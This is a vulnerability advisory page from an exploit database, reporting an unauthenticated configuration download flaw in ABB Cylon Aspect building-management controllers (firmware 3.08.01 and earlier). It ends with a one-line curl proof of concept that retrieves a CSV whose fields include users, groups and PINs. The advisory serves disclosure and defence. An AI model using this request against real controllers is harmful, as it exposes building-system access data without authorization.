---
title: ABB Cylon Aspect 3.08.01 vstatConfigurationDownload.php Configuration Download
url: https://cxsecurity.com/issue/WLB-2024110043
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-11-29
fetch_date: 2025-10-06T19:14:27.739156
---

# ABB Cylon Aspect 3.08.01 vstatConfigurationDownload.php Configuration Download

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **ABB Cylon Aspect 3.08.01 vstatConfigurationDownload.php Configuration Download** **2024.11.28**  Credit:  **[LiquidWorm](https://cxsecurity.com/author/LiquidWorm/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

ABB Cylon Aspect 3.08.01 (vstatConfigurationDownload.php) Config Download
Vendor: ABB Ltd.
Product web page: https://www.global.abb
Affected version: NEXUS Series, MATRIX-2 Series, ASPECT-Enterprise, ASPECT-Studio
Firmware: <=3.08.01
Summary: ASPECT is an award-winning scalable building energy management
and control solution designed to allow users seamless access to their
building data through standard building protocols including smart devices.
The addition of vSTAT, a Virtual Zone application, allows for authorised
users to change temperature setpoints, occupancy status, fan status, and more.
Delivering the power to control from any internet enabled device. With AspectFT,
vSTAT can be customized to display and control custom points. Want to turn the
lights on or off? vSTAT can be programed to do it remotely.
Desc: The ABB BMS/BAS controller suffers from an unauthenticated configuration
download vulnerability. This can be exploited to download the CSV DB that
contains the configuration mappings information via the VMobileImportExportServlet
by directly calling the vstatConfigurationDownload.php script.
Tested on: GNU/Linux 3.15.10 (armv7l)
GNU/Linux 3.10.0 (x86\_64)
GNU/Linux 2.6.32 (x86\_64)
Intel(R) Atom(TM) Processor E3930 @ 1.30GHz
Intel(R) Xeon(R) Silver 4208 CPU @ 2.10GHz
PHP/7.3.11
PHP/5.6.30
PHP/5.4.16
PHP/4.4.8
PHP/5.3.3
AspectFT Automation Application Server
lighttpd/1.4.32
lighttpd/1.4.18
Apache/2.2.15 (CentOS)
OpenJDK Runtime Environment (rhel-2.6.22.1.-x86\_64)
OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode)
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2024-5863
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2024-5863.php
21.04.2024
--
$ cat project
P R O J E C T
.|
| |
|'| .\_\_\_\_\_
\_\_\_ | | |. |' .---"|
\_ .-' '-. | | .--'| || | \_| |
.-'| \_.| | || '-\_\_ | | | || |
|' | |. | || | | | | || |
\_\_\_\_| '-' ' "" '-' '-.' '` |\_\_\_\_
░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░▒▓███████▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓██████▓▒░
░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░░░░░░
░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒▒▓███▓▒░
░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
░▒▓█▓▒░░░░░░░░▒▓██████▓▒░ ░▒▓██████▓▒░
$ curl http://192.168.73.31/vstatConfigurationDownload.php
DisplayName,Path,SearchText,Users,Groups,GuestAccessAllowed,ReferenceText,Pin

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024110043)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top